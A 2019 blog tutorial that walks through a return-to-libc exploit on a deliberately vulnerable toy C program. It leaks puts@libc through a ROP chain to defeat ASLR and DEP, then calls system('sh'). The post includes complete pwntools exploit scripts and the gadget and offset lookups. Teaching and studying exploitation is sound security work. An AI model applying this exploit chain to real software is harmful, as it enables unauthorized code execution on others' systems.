---
layout: post
title:  "Bypassing ASLR and DEP - Getting Shells with pwntools"
date:   2019-07-03 00:45:05 +0300
categories: security
thumbnail: /imgs/thumbnails/ret_buffer_overflow.png
---

Today, I'd like to take some time and to present a short trick to bypass both **ASLR** (*Address Space Layout Randomization*) and **DEP** (*Data Execution Prevention*) in order to obtain a shell in a **buffer-overflow** vulnerable binary.

I've seen this problem discussed using **return-to-PLT** strategies, which is fine if your targeted method is already used in the binary -- although, let's face it, not many programs will call `system()` or `exec()` and invite you to spawn shells. 

This approach revolves around a **return-to-libc** attack in which the attacker first **leaks the address** of a known function (e.g.: `puts()`) and then computes the **offset** between that known function and the targeted function (e.g.: `system()`). By summing the 2 values, the result is the address of the function that we want to call using the exploit. If you understood this part, you only need to prepare the payloads.

Given a vulnerable binary, let's consider the following scenario:

1. **ASLR** is enabled
2. **DEP** is enabled
3. Only `gets()` and `puts()` are called in the binary
4. Running on a **x64** system (no bruteforce)
5. For the sake of simplicity: no stack protectors (**no canary values**)
6. The attacker knows which **libc** version is used by the binary 

## Vulnerable Binary

While writing this, I've been using this really simple binary (vuln.c):

{% highlight c linenos %}
#include<stdio.h>

int main()
{
    char buffer[40];
    gets(buffer);

    printf("hi there\n");

    return 0;
}
{% endhighlight %}

Compiled with the following parameters:


{% highlight bash linenos %}
gcc -Wall -ansi -fno-stack-protector vuln.c -o vuln
{% endhighlight %}


## Step 1: Basic Buffer Overflow

We start by finding the offset in order to **overwrite** the **return address** and perform a simple execution hijacking. There are multiple ways of doing this: you can either start with a payload of a random size and analyze the behaviour of the binary in a debugger (like **GDB**) such as the image below, where we overwrite the return address and the **RIP** (PC) jumps to **0x414241424142** ("**ABABAB**")

{% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_buffer_overflow.webp" description="Finding the offset for a buffer overflow attack by trial-and-error" %}



I usually test this with an address that calls a specific function or jumps back to the start of the program (**0x400566**)

{% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_main_addr.webp" description="The 'main' address is used to call the program multiple times and supply multiple payloads" %}


Should you succeed, it will print twice the same message:

{% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_call_twice.webp" description="Running the same program twice to prevent ASLR re-randomization" %}


---

_Why is this important?_

It is important because **ASLR** randomizes the heap, stack and the offsets where are mapped the libraries (such as libc) only when the binary is launched into execution. Calling main once again will **not** trigger a re-randomization. 

This means we can submit multiple payloads while having fixed offsets (mitigating the effect of ASLR).

---


## Step 2: Leaking the Address of puts@libc

This is the difficult part. Multiple payloads are required in order to spawn a shell using this binary. Basically, you'll want to leak the address of `puts()` using a `puts@PLT()` call and then compute the address of `system()` by having access to **libc**. Additionally, you'll want to compute the address of a **"sh"** string, in order to achieve a `system("sh")` call. You'll have to use a second payload to perform the aforementioned call.

I recommend you perform these steps using a framework like **pwntools** since the the second payload must be adapted using information leaked at runtime.


To continue, one must understand the role of the **GOT** (*Global Offset Table*) in a binary as there is no exact way of previously knowing where **ASLR** will map each external library of the current process.

{% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_ldd.webp" description="Running ldd reveals different mapping addresses of libc each time the process starts" %}

The addresses of the external methods are usually determined at runtime when these methods are called for the first time (i.e.: when the **PLT** trampoline is executed for the first time).
However, the addresses need to be referenced in the original code before the program runs -> so placeholders (fixed addresses / **@GOT** addresses) are used. **GOT** acts as a _dictionary_ and binds
the placeholder addresses to the real/external addresses (in the library). The values of the **GOT** are determined and written by the dynamic address solver (linker) once a method is called.


In our first payload, we'll want to use **GOT** addresses (placeholders) instead of external addresses (which are randomized). One interesting observation is that calling `puts(puts@GOT)` will
actually output the external address of `puts@libc`.

We'll want our initial payload to perform such a call in order to have an initial idea of where the libc is mapped.

Start by running the following command so you can view the address of `puts@GOT`:

{% highlight bash linenos %}
objdump -R vuln {% endhighlight %}

Pay attention at the second row and write down the address:

```
OFFSET           TYPE                VALUE

0000000000600ff8 R_X86_64_GLOB_DAT   __gmon_start__
> 0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
0000000000601028 R_X86_64_JUMP_SLOT  gets@GLIBC_2.2.5
```


Next, you'll need a **ROP gadget** that takes a parameter from the stack and places it into the **RDI** register (in our case, takes the **@GOT** address from our payload, from the stack, and sets it as the first parameter for a future `puts@PLT` call). As you remember, we're running on a **x64** architecture and the calling convention
states that the first parameter of a method must be placed in the **RDI** register. We're looking for a `POP RDI; RET` gadget -- I'm doing this using **ROPgadget** (so it's `ROPgadget --binary vuln`)
but feel free to use whatever you're confortable with (GDB, radare2, etc.). 

We'll get the following line:

`0x00000000004005f3 : pop rdi ; ret`


The last thing that the payload requires is a way to call `puts()`. We can achieve this by calling `puts@PLT` (through the **PLT** trampoline) since its address is also fixed and unaffected by **ASLR**.  
You can use something like this to extract the address from the binary:

{% highlight bash linenos %}
objdump -d -M intel vuln | grep "puts@plt"
{% endhighlight %}

I got something like this:

`0000000000400430 <puts@plt>:`



Finally, we can construct the first payload. I'll write this as a **pwntools** python script so I'll be able to expand it and include the second payload.
The new flow of the program must be the following:

RET to pop_rdi_ret_address -> (RDI = puts@GOT) RET to puts_plt_address -> RET to main  

{% highlight python linenos %}
from pwn import *

r = process('vuln')

main_address = 0x00400566
puts_got_address = 0x0000000000601018
puts_plt_address = 0x0000000000400430
pop_rdi_ret_address = 0x00000000004005f3

payload = 'A'*56 + p64(pop_rdi_ret_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(main_address)

r.sendline(payload)
print r.recvline() # "hi there"

leaked_output = r.recvline()
leaked_output = leaked_output[:-1]

print('leaked puts() address', leaked_output)
r.sendline('a')
print r.recvline() # "hi there"

{% endhighlight %}


And when running it...

{% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_payload_leak_puts.webp" description="Leaking the address of puts@libc" %}



## Step 3: Finding the Address of system@libc

In this part, we compute the **offset** between `puts@libc` and `system@libc` while also finding the address of a **"sh"** string.
We know, from the previous **ldd** run, that the binary uses the libc located at: **/lib/x86_64-linux-gnu/libc.so.6**.

Running the following commands will return the **offsets** of `system()` and `puts()` from libc:

{% highlight bash linenos %}
objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
objdump -d -M intel /lib/x86_64-linux-gnu/libc.so.6 | grep "_IO_puts"
{% endhighlight %}

The lines of interest are:

```
0000000000045390 <__libc_system@@GLIBC_PRIVATE>:
000000000006f690 <_IO_puts@@GLIBC_2.2.5>:
```

I found the **offset** of the **"sh"** string inside **libc** using **radare2**. Pick one.

{% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_sh_address.webp" description="Offsets of various 'sh' strings inside libc (radare2)" %}



Subtracting `puts()`'s offset from the leaked `puts@libc` address gives us the **base address** of libc (the start of the memory region where it is mapped for the current process).
By adding the offset of `system()` we get a call to `system@libc`.

Now, we can adapt the previous script in order to create the second payload that makes the call.

{% highlight python linenos %}
from pwn import *

r = process('vuln')

main_address = 0x00400566
puts_got_address = 0x0000000000601018
puts_plt_address = 0x0000000000400430
pop_rdi_ret_address = 0x00000000004005f3

puts_libc_offset = 0x000000000006f690
system_libc_offset = 0x0000000000045390
sh_libc_offset = 0x00011e70

payload = 'A'*56 + p64(pop_rdi_ret_address) + p64(puts_got_address) + p64(puts_plt_address) + p64(main_address)

r.sendline(payload)
print r.recvline()

leaked_output = r.recvline()
leaked_output = leaked_output[:-1]

print('leaked puts() address', leaked_output)

leaked_output += '\x00\x00'

puts_libc_address = u64(leaked_output)

system_libc_address = puts_libc_address - puts_libc_offset + system_libc_offset
print('system() address', p64(system_libc_address))

sh_libc_address = puts_libc_address - puts_libc_offset + sh_libc_offset

payload = 'A'*56 + p64(pop_rdi_ret_address) + p64(sh_libc_address) + p64(system_libc_address) + p64(main_address)

r.sendline(payload)
print(r.recvline()) # hi there

r.sendline(payload)

r.interactive()
{% endhighlight %}


## Small Proof-Of-Concept

If you followed the steps correctly, you should achieve something like this:

{% include image.html url="/imgs/posts/bypassing-aslr-dep-getting-shells-with-pwntools/bypass_aslr_dep_poc_shell.webp" description="Proof-Of-Concept: Shell spawned inside a Process with ASLR and DEP" %}

<a href="https://www.codeproject.com" rel="tag" style="display:none">CodeProject</a>

